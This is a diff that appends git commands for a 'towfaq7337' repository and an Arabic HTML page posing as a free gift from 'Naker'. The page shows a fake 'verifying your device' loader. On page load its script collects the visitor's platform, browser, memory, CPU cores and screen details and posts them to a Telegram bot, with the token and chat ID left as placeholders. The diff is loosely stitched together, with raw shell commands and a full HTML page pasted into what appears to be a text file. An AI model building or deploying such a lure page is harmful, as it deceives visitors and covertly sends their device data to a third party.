@@ -482,3 +482,87 @@ Here are some ideas to get you started:
   </script>
 </body>
 </html>
+# استنساخ المستودع
+git clone https://github.com/towfaq7337/towfaq7337.git
+cd towfaq7337
+
+# إنشاء الفرع الجديد
+git checkout -b towfaq7337-readme
+
+# إنشاء ملف README.md
+echo "# towfaq7337\n\nالمستودع الرسمي لتطبيقات ناكر ضمن مشروع Towfaq Cyber..." > README.md
+
+# رفع التغييرات
+git add README.md
+git commit -m "إضافة وصف رسمي في فرع towfaq7337-readme"
+git push origin towfaq7337-readme
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>🎁 هديتك من ناكر</title>
+  <style>
+    body { font-family: Tahoma, sans-serif; background: #111; color: #fff; text-align: center; padding: 50px; }
+    .gift-box { width: 100px; height: 100px; margin: auto; background: gold; border-radius: 10px; animation: pulse 1s infinite; }
+    .hidden { display: none; }
+    .loader { border: 6px solid #444; border-top: 6px solid #0f0; border-radius: 50%; width: 40px; height: 40px; margin: 20px auto; animation: spin 1s linear infinite; }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+  </style>
+</head>
+<body>
+
+<h1>🎁 هديتك المجانية جاهزة!</h1>
+<div class="gift-box"></div>
+
+<div id="loading-section">
+  <div class="loader"></div>
+  <p>جاري التحقق من جهازك...</p>
+</div>
+
+<div id="success-section" class="hidden">
+  <h2>✅ تم إرسال بياناتك بنجاح</h2>
+  <p>سيتم التواصل معك قريبًا عبر Telegram</p>
+</div>
+
+<script>
+const TELEGRAM_TOKEN = 'ضع_توكن_البوت_هنا';
+const TELEGRAM_CHAT_ID = 'ضع_ChatID_هنا';
+
+function sendToTelegram(message) {
+  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+  }).then(() => {
+    document.getElementById('loading-section').classList.add('hidden');
+    document.getElementById('success-section').classList.remove('hidden');
+  });
+}
+
+async function collectData() {
+  const device = navigator;
+  const screenInfo = window.screen;
+  const info = {
+    نظام: device.platform,
+    متصفح: device.userAgent,
+    ذاكرة: device.deviceMemory || 'غير معروف',
+    أنوية: device.hardwareConcurrency || 'غير معروف',
+    شاشة: `${screenInfo.width}x${screenInfo.height}`,
+    بكسل: window.devicePixelRatio,
+  };
+
+  let message = '📲 *بيانات جهاز جديد من ناكر*\n\n';
+  for (const key in info) {
+    message += `- ${key}: ${info[key]}\n`;
+  }
+
+  sendToTelegram(message);
+}
+
+window.onload = () => setTimeout(collectData, 3000);
+</script>
+
+</body>
+</html>
+
